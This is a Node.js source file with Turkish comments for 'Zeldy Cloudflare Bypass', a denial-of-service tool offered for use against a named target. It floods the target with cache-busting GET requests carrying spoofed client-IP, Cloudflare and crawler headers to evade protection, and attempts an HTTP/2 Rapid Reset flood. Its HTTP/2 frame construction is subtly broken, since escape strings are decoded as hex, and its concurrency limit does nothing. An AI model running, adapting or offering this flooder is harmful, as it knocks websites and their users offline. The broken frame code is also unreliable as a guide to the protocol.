/*
 * Zeldy Cloudflare Bypass v1.0 - Node.js
 * Cloudflare atlatma + HTTP/2 Rapid Reset
 * Kullanım: node cfbypass.js <hedef> <port> <sure> <thread>
 * Örnek: node cfbypass.js example.com 443 30 200
 */

const https = require('https');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');

// ========== KONFIG ==========
const TARGET = process.argv[2] || 'example.com';
const PORT = parseInt(process.argv[3]) || 443;
const DURATION = parseInt(process.argv[4]) || 30;
const THREADS = parseInt(process.argv[5]) || 200;

// ========== FAKE IP HAVUZU ==========
const fakeIPs = [];
for (let i = 0; i < 5000; i++) {
    fakeIPs.push(`${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`);
}

// ========== USER-AGENT LISTESI ==========
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) Safari/605.1.15',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15'
];

// ========== CF HEADER ==========
const cfHeaders = [
    'sec-ch-ua: "Chromium";v="120", "Not_A Brand";v="8"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1'
];

function getRandom(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomHex(len) {
    return crypto.randomBytes(len).toString('hex');
}

// ========== CLOUDFLARE BYPASS ==========
function cfBypass() {
    return new Promise((resolve) => {
        try {
            const fakeIP = getRandom(fakeIPs);
            const ua = getRandom(userAgents);
            const path = `/${Math.floor(Math.random()*999999)}?${randomHex(10)}`;
            
            const headers = {
                'Host': TARGET,
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'X-Forwarded-For': fakeIP,
                'X-Real-IP': fakeIP,
                'CF-Connecting-IP': fakeIP,
                'CF-IPCountry': 'US',
                'CF-Ray': randomHex(8),
                'CF-Visitor': '{"scheme":"https"}',
                'Connection': 'keep-alive'
            };
            
            // Random CF headers
            const extraHeaders = getRandom(cfHeaders);
            const [key, value] = extraHeaders.split(': ');
            headers[key] = value;
            
            const options = {
                hostname: TARGET,
                port: PORT,
                path: path,
                method: 'GET',
                headers: headers,
                rejectUnauthorized: false,
                timeout: 3000
            };
            
            const client = PORT === 443 ? https : http;
            const req = client.request(options, (res) => {
                res.on('data', () => {});
                res.on('end', () => {
                    resolve(true);
                });
            });
            
            req.on('error', () => {
                resolve(false);
            });
            
            req.on('timeout', () => {
                req.destroy();
                resolve(false);
            });
            
            req.end();
        } catch {
            resolve(false);
        }
    });
}

// ========== HTTP/2 RAPID RESET ==========
function http2RapidReset() {
    return new Promise((resolve) => {
        try {
            const socket = tls.connect(PORT, TARGET, {
                rejectUnauthorized: false,
                timeout: 3000
            }, () => {
                // HTTP/2 PRI önsözü
                socket.write('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n');
                
                // HEADERS + RST_STREAM çerçeveleri
                for (let i = 0; i < 20; i++) {
                    const headers = Buffer.from(`\x00\x00\x10\x01\x04\x00\x00\x00\x00\x00${randomHex(8)}`, 'hex');
                    const rst = Buffer.from('\x00\x00\x04\x03\x00\x00\x00\x00\x00\x00', 'hex');
                    socket.write(headers);
                    socket.write(rst);
                }
                
                setTimeout(() => {
                    socket.destroy();
                    resolve(true);
                }, 100);
            });
            
            socket.on('error', () => {
                resolve(false);
            });
            
            socket.on('timeout', () => {
                socket.destroy();
                resolve(false);
            });
        } catch {
            resolve(false);
        }
    });
}

// ========== ANA FONKSIYON ==========
async function attack() {
    console.log(`
    ╔═══════════════════════════════════════════╗
    ║   ZELDY CF BYPASS v1.0 (Node.js)        ║
    ║   Cloudflare Atlatma + HTTP/2 Rapid Reset║
    ║   Hedef: ${TARGET}:${PORT}                 ║
    ║   Sure: ${DURATION}s                      ║
    ║   Thread: ${THREADS}                     ║
    ╚═══════════════════════════════════════════╝
    `);
    
    const startTime = Date.now();
    let success = 0;
    let fail = 0;
    let completed = 0;
    const totalRequests = THREADS * 50;
    
    const promises = [];
    
    for (let i = 0; i < THREADS; i++) {
        promises.push(cfBypass());
        promises.push(http2RapidReset());
    }
    
    // Limitli paralel çalıştır
    const chunkSize = 50;
    for (let i = 0; i < promises.length; i += chunkSize) {
        const chunk = promises.slice(i, i + chunkSize);
        const results = await Promise.allSettled(chunk);
        
        for (const result of results) {
            if (result.status === 'fulfilled' && result.value === true) {
                success++;
            } else {
                fail++;
            }
            completed++;
        }
        
        if (Date.now() - startTime > DURATION * 1000) break;
        
        // Progress
        process.stdout.write(`\r[+] İlerleme: ${completed}/${promises.length} | Başarılı: ${success} | Hata: ${fail}`);
    }
    
    const elapsed = (Date.now() - startTime) / 1000;
    console.log(`\n\n[+] TAMAMLANDI!`);
    console.log(`[+] Başarılı: ${success}`);
    console.log(`[+] Hata: ${fail}`);
    console.log(`[+] Sure: ${elapsed.toFixed(1)}s`);
}

// ========== ÇALIŞTIR ==========
attack().catch(console.error);
